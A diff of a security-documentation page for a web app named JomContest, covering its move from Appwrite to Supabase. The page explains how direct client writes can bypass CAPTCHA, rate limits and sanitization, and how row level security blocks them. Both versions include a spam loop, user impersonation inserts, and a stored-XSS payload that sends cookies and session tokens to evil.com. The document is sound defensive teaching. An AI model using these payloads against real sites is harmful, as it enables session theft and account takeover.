@@ -2,53 +2,58 @@
 
 ## ⚠️ WARNING: For Educational Purposes Only
 
-This document shows how an attacker could bypass security **before the fix**. After removing "Create" permissions, these attacks will fail.
+This document shows how an attacker could bypass the server-side protections
+(CAPTCHA, rate limiting, sanitization) by writing **directly** to the database,
+and how **Row Level Security (RLS)** stops it. After the correct RLS policies are
+in place, these attacks fail.
 
 ---
 
-## Attack Scenario: Bypassing process-feedback
+## Attack Scenario: Bypassing the Edge Function
+
+JomContest routes abuse-prone writes (e.g. `receipts`, and ideally `feedback`)
+through a **Supabase Edge Function** that verifies a Cloudflare Turnstile token,
+enforces rate limits, and sanitizes input before writing with the service role.
+
+An attacker's goal is to skip that Edge Function and write straight to the table.
 
 ### Step 1: Attacker Opens Browser Console
 
-An attacker opens your website, logs in (or creates an account), then opens browser DevTools console (F12).
+An attacker opens your website, logs in (or creates an account), then opens
+browser DevTools console (F12).
 
-### Step 2: Import Appwrite SDK
+### Step 2: Create a Supabase Client
+
+The Supabase URL and **publishable/anon** key are public by design (they ship in
+the client bundle). RLS is what actually protects the data.
 
 ```javascript
 // In browser console:
 
-// Option A: If your app exposes the SDK globally
-const { databases } = window.appwriteSDK
+// Option A: reuse the app's client if exposed
+const supabase = window.__supabase
 
-// Option B: Import from your bundled code
-const databases = require('app/provider/appwrite/api').databases
-
-// Option C: Create their own client
-const { Client, Databases } = require('node-appwrite')
-const client = new Client()
-  .setEndpoint('https://cloud.appwrite.io/v1') // Your Appwrite endpoint
-  .setProject('your-project-id') // Your project ID (visible in network requests)
-
-const databases = new Databases(client)
+// Option B: create their own client with values read from the bundle/network
+import { createClient } from '@supabase/supabase-js'
+const supabase = createClient(
+  'https://your-project.supabase.co', // NEXT_PUBLIC_SUPABASE_URL
+  'sb_publishable_...' // NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY (public, safe)
+)
 ```
 
-### Step 3: Direct Write Attack (Before Fix)
+### Step 3: Direct Write Attack (Before RLS is correct)
 
 ```javascript
-// ❌ BEFORE FIX: This succeeds and bypasses ALL security!
+// ❌ BEFORE FIX: if the table allows INSERT for the `authenticated` role,
+// this succeeds and bypasses ALL server-side protections!
 
-await databases.createDocument(
-  'your-database-id', // Found in network requests
-  'usersFeedback', // Collection ID (visible in Appwrite console or network)
-  'unique()', // Generate unique ID
-  {
-    user_id: 'any_user_id', // Can impersonate anyone!
-    message: '<script>alert("XSS")</script>', // XSS payload
-    page_url: 'https://evil.com', // Fake URL
-  }
-)
+await supabase.from('feedback').insert({
+  user_id: 'any_user_id', // Can impersonate anyone!
+  message: '<script>alert("XSS")</script>', // XSS payload
+  page_url: 'https://evil.com', // Fake URL
+})
 
-// Result: Document created!
+// Result: Row created!
 // - No CAPTCHA verification ❌
 // - No rate limiting ❌
 // - No input sanitization ❌
@@ -58,44 +63,34 @@ await databases.createDocument(
 ### Step 4: Spam Attack
 
 ```javascript
-// Spam 1000 feedback entries in seconds
+// Spam 1000 rows in seconds
 for (let i = 0; i < 1000; i++) {
-  await databases.createDocument(
-    'your-database-id',
-    'usersFeedback',
-    'unique()',
-    {
-      user_id: 'victim_user_id',
-      message: `Spam message ${i}`,
-      page_url: 'https://spam.com',
-    }
-  )
+  await supabase.from('feedback').insert({
+    user_id: 'victim_user_id',
+    message: `Spam message ${i}`,
+    page_url: 'https://spam.com',
+  })
 }
 
-// Result: Database flooded with spam ❌
+// Result: Table flooded with spam ❌
 ```
 
 ### Step 5: XSS Attack
 
 ```javascript
-// Store XSS payload in database
-await databases.createDocument(
-  'your-database-id',
-  'usersFeedback',
-  'unique()',
-  {
-    user_id: 'attacker_id',
-    message: `
-      <img src=x onerror="
-        fetch('https://evil.com/steal?cookie=' + document.cookie);
-        fetch('https://evil.com/steal?token=' + localStorage.getItem('appwrite-session'));
-      ">
-    `,
-    page_url: 'https://jomcontest.com',
-  }
-)
+// Store XSS payload in the database
+await supabase.from('feedback').insert({
+  user_id: 'attacker_id',
+  message: `
+    <img src=x onerror="
+      fetch('https://evil.com/steal?cookie=' + document.cookie);
+      fetch('https://evil.com/steal?token=' + localStorage.getItem('sb-your-project-auth-token'));
+    ">
+  `,
+  page_url: 'https://jomcontest.com',
+})
 
-// If admin views this feedback without sanitization:
+// If an admin views this feedback without sanitization:
 // - Session token stolen ❌
 // - Cookies stolen ❌
 // - Account compromised ❌
@@ -105,39 +100,45 @@ await databases.createDocument(
 
 ## ✅ After Fix: All Attacks Fail
 
-### Step 1: Remove "Create" Permissions
+### Step 1: Lock Down the Table with RLS
 
-```
-Appwrite Console → Databases → usersFeedback → Settings → Permissions
-- Remove: Create (Users) ✅
-- Keep: Read (Users, own documents) ✅
+Enable RLS and only allow reads (scoped to the owner). Do **not** grant a direct
+`INSERT` policy to the `authenticated` role — writes must go through the Edge
+Function, which uses the service role key (and the service role bypasses RLS).
+
+```sql
+alter table public.feedback enable row level security;
+
+-- Users can read only their own rows
+create policy "read own feedback"
+  on public.feedback for select
+  to authenticated
+  using (auth.uid() = user_id);
+
+-- NOTE: no INSERT policy for `authenticated` → direct client inserts are denied.
+-- The Edge Function writes with the service role key, which bypasses RLS.
 ```
 
-### Step 2: Attacker Tries Same Attack
+### Step 2: Attacker Tries the Same Attack
 
 ```javascript
-// ✅ AFTER FIX: This fails!
+// ✅ AFTER FIX: this fails!
 
-await databases.createDocument(
-  'your-database-id',
-  'usersFeedback',
-  'unique()',
-  {
-    user_id: 'any_user_id',
-    message: '<script>alert("XSS")</script>',
-    page_url: 'https://evil.com',
-  }
-)
+const { error } = await supabase.from('feedback').insert({
+  user_id: 'any_user_id',
+  message: '<script>alert("XSS")</script>',
+  page_url: 'https://evil.com',
+})
 
 // Result: Error!
-// AppwriteException: Missing permissions (document.create)
-// Status: 401 Unauthorized
+// error.message: new row violates row-level security policy for table "feedback"
+// error.code: '42501' (insufficient_privilege)
 ```
 
-### Step 3: Only Valid Path Works
+### Step 3: Only the Valid Path Works
 
 ```javascript
-// ✅ Attacker must use the UI (which enforces security)
+// ✅ The attacker must use the UI, which enforces security
 
 // User clicks feedback button
 // → FeedbackDialog opens
@@ -146,7 +147,7 @@ await databases.createDocument(
 // → Rate limiting enforced ✅
 // → Input sanitized ✅
 // → Suspicious activity logged ✅
-// → process-feedback function creates document (with API key)
+// → Edge Function inserts the row (with the service role key)
 ```
 
 ---
@@ -158,88 +159,90 @@ await databases.createDocument(
 Open DevTools → Network tab → Submit feedback:
 
 ```http
-POST https://cloud.appwrite.io/v1/functions/your-function-id/executions
+POST https://your-project.supabase.co/functions/v1/receipts
 Headers:
-  X-Appwrite-Project: your-project-id
-  X-SDK-Version: appwrite:web:11.0.0
+  apikey: sb_publishable_...
+  Authorization: Bearer <user-jwt>
 Body:
   {
     "user_id": "user123",
-    "message": "test",
-    "page_url": "https://jomcontest.com",
     "captcha_token": "xxx"
   }
 ```
 
+Or a direct PostgREST call:
+
+```http
+POST https://your-project.supabase.co/rest/v1/feedback
+Headers:
+  apikey: sb_publishable_...
+  Authorization: Bearer <user-jwt>
+```
+
 **Attacker learns:**
 
-- Appwrite endpoint: `https://cloud.appwrite.io/v1`
-- Project ID: `your-project-id`
-- Database ID: (visible in other requests)
-- Collection ID: `usersFeedback`
+- Supabase URL: `https://your-project.supabase.co`
+- Publishable/anon key (public — safe because of RLS)
+- Table/endpoint names: `feedback`, `receipts`
 
 ### 2. JavaScript Bundle
 
 Attacker inspects your bundled JavaScript:
 
 ```javascript
-// In your app's JS bundle:
-const DATABASE_ID = 'production'
-const USERS_FEEDBACK_COLLECTION_ID = 'usersFeedback'
-const APPWRITE_PROJECT_ID = '67123abc...'
+// In your app's JS bundle (all public, all safe with RLS):
+const SUPABASE_URL = 'https://your-project.supabase.co'
+const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_...'
 ```
 
-### 3. Appwrite Console (If Accessible)
+### 3. What Stays Secret
 
-If attacker creates an account and has access to Appwrite console:
+- `SUPABASE_SERVICE_ROLE_KEY` — **never** in the client; only in Edge Function secrets
+- `TURNSTILE_SECRET_KEY` — only in Edge Function secrets
 
-- Can see all collection names
-- Can see all attribute names
-- Can see permissions
-- Can test API directly
+Without the service role key, RLS applies to every request the attacker can make.
 
 ---
 
 ## 🛡️ Defense: Multiple Layers
 
-### Layer 1: Collection Permissions (This Fix)
+### Layer 1: Row Level Security (This Fix)
 
-```
-usersFeedback collection:
-- Create: (none) ✅
-- Read: Users (own documents) ✅
-```
-
-**Result:** Direct writes fail with 401 Unauthorized
-
-### Layer 2: Function Validation
-
-```javascript
-// In process-feedback function:
-1. Verify CAPTCHA token ✅
-2. Check rate limits ✅
-3. Sanitize input ✅
-4. Log suspicious activity ✅
-5. Create document (with API key) ✅
+```sql
+-- feedback table:
+-- SELECT: owner only
+-- INSERT: none for authenticated → clients cannot write directly
 ```
 
-**Result:** Even if attacker calls function, security is enforced
+**Result:** Direct writes fail with `42501` (RLS violation)
 
-### Layer 3: API Key Scopes
+### Layer 2: Edge Function Validation
+
+```typescript
+// In the receipts/feedback Edge Function:
+// 1. Verify CAPTCHA token ✅
+// 2. Check rate limits ✅
+// 3. Sanitize input ✅
+// 4. Log suspicious activity ✅
+// 5. Insert row (with service role key) ✅
+```
+
+**Result:** Even if the attacker calls the function, security is enforced
+
+### Layer 3: Service Role Key Isolation
 
 ```
-INTERNAL_API_KEY scopes:
-- databases.write (only for specific collections)
-- execution.read (only for calling other functions)
-- users.read (only for fetching user data)
+SUPABASE_SERVICE_ROLE_KEY:
+- Stored only as an Edge Function secret
+- Bypasses RLS (so it must never reach the client)
 ```
 
-**Result:** API key has minimal permissions
+**Result:** The only code that can write is server-side and validated
 
 ### Layer 4: Input Sanitization
 
-```javascript
-// In sanitize-text function:
+```typescript
+// In the Edge Function:
 - Remove HTML tags ✅
 - Remove script patterns ✅
 - Remove dangerous schemes ✅
@@ -250,11 +253,11 @@ INTERNAL_API_KEY scopes:
 
 ### Layer 5: Rate Limiting
 
-```javascript
-// In validate-captcha function:
-- Per-user limits (10/hour) ✅
-- Per-IP limits (20/hour) ✅
-- Global limits (1000/hour) ✅
+```typescript
+// In the Edge Function:
+- Per-user limits ✅
+- Per-IP limits ✅
+- Global limits ✅
 ```
 
 **Result:** Spam attacks are throttled
@@ -268,25 +271,20 @@ INTERNAL_API_KEY scopes:
 **In browser console:**
 
 ```javascript
-// Import Appwrite SDK
-import { databases } from 'app/provider/appwrite/api'
+import { createClient } from '@supabase/supabase-js'
+const supabase = createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY)
 
-// Try to create document directly
-try {
-  const result = await databases.createDocument(
-    'production', // Your database ID
-    'usersFeedback',
-    'unique()',
-    {
-      user_id: 'test',
-      message: 'test',
-      page_url: 'https://test.com',
-    }
-  )
-  console.log('❌ SECURITY ISSUE: Direct write succeeded!', result)
-} catch (error) {
+const { data, error } = await supabase.from('feedback').insert({
+  user_id: 'test',
+  message: 'test',
+  page_url: 'https://test.com',
+})
+
+if (error) {
   console.log('✅ SECURE: Direct write blocked!', error.message)
-  // Expected: "Missing permissions (document.create)"
+  // Expected: new row violates row-level security policy for table "feedback"
+} else {
+  console.log('❌ SECURITY ISSUE: Direct write succeeded!', data)
 }
 ```
 
@@ -302,15 +300,15 @@ try {
 
 ### Test 3: Verify in Database
 
-**In Appwrite Console:**
+**In the Supabase Dashboard (Table Editor / SQL):**
 
-1. Go to Databases → usersFeedback → Documents
-2. Find the test document
+1. Open `public.feedback`
+2. Find the test row
 3. Verify:
    - `message` is sanitized (no HTML tags)
    - `page_url` is valid
-   - `user_id` matches logged-in user
-   - `$createdAt` timestamp is recent
+   - `user_id` matches the logged-in user
+   - `created_at` timestamp is recent
 
 ---
 
@@ -320,7 +318,7 @@ try {
 
 | Attack Type       | Possible? | Impact                       |
 | ----------------- | --------- | ---------------------------- |
-| Spam flooding     | ✅ Yes    | Database filled with garbage |
+| Spam flooding     | ✅ Yes    | Table filled with garbage    |
 | XSS injection     | ✅ Yes    | Admin accounts compromised   |
 | Impersonation     | ✅ Yes    | Fake feedback from any user  |
 | Rate limit bypass | ✅ Yes    | Unlimited submissions        |
@@ -328,13 +326,13 @@ try {
 
 ### After Fix (Secure):
 
-| Attack Type       | Possible? | Impact                   |
-| ----------------- | --------- | ------------------------ |
-| Spam flooding     | ❌ No     | Rate limiting enforced   |
-| XSS injection     | ❌ No     | Input sanitized          |
-| Impersonation     | ❌ No     | User ID from auth token  |
-| Rate limit bypass | ❌ No     | Function enforces limits |
-| CAPTCHA bypass    | ❌ No     | Function verifies token  |
+| Attack Type       | Possible? | Impact                       |
+| ----------------- | --------- | ---------------------------- |
+| Spam flooding     | ❌ No     | RLS blocks direct writes     |
+| XSS injection     | ❌ No     | Input sanitized in function  |
+| Impersonation     | ❌ No     | user_id from the auth token  |
+| Rate limit bypass | ❌ No     | Edge Function enforces limits|
+| CAPTCHA bypass    | ❌ No     | Edge Function verifies token |
 
 ---
 
@@ -344,9 +342,9 @@ try {
 
 **Day 1 (Before Fix):**
 
-- Attacker discovers vulnerability
-- Writes script to spam feedback
-- Submits 10,000 entries in 10 minutes
+- Attacker discovers a table with a permissive INSERT policy
+- Writes a script to spam feedback
+- Submits 10,000 rows in 10 minutes
 - Database storage costs spike
 - Admin dashboard unusable
 
@@ -356,22 +354,20 @@ try {
 - Admin views feedback
 - Session token stolen
 - Attacker gains admin access
-- Deletes all contests
-- Steals user data
+- Deletes contests, steals user data
 
 **Day 3:**
 
 - Users report missing contests
 - Reputation damaged
 - Legal liability for data breach
-- Business impact: $$$$$
 
 ### With Fix:
 
 **Day 1:**
 
 - Attacker tries to spam
-- Gets 401 Unauthorized error
+- Every direct insert fails with an RLS error (`42501`)
 - Gives up and moves on
 - Business continues normally ✅
 
@@ -379,23 +375,21 @@ try {
 
 ## 💡 Key Takeaways
 
-1. **Never trust client-side security** - Always enforce on server
-2. **Use collection permissions** - Restrict who can create documents
-3. **Use API keys for functions** - Server-side permissions bypass user limits
-4. **Defense in depth** - Multiple layers of security
-5. **Test your security** - Try to attack your own app
+1. **Never trust client-side security** — always enforce on the server
+2. **Enable RLS on every table** — deny direct client writes to sensitive tables
+3. **Use the service role only in Edge Functions** — it bypasses RLS, so keep it secret
+4. **Defense in depth** — RLS + CAPTCHA + rate limits + sanitization
+5. **Test your security** — try to attack your own app
 
 ---
 
 ## 📚 Related Documentation
 
-- `docs/SECURITY_FIX_USERS_FEEDBACK.md` - Complete fix guide
-- `docs/SECURITY_FAQ.md` - Common security questions
-- `docs/DEPLOYMENT_SETUP_GUIDE.md` - Setup instructions
-- `functions/process-feedback/index.js` - Secure function implementation
+- [CAPTCHA Security](./CAPTCHA_SECURITY.md) — server-side verification flow
+- [Environment Variables](./ENVIRONMENT_VARIABLES.md) — which keys are public vs secret
+- `supabase/functions/receipts/index.ts` — Edge Function that enforces the write rules
 
 ---
 
-_Last Updated: October 27, 2025_
 _⚠️ For Educational Purposes Only_
 _Do Not Use for Malicious Purposes_
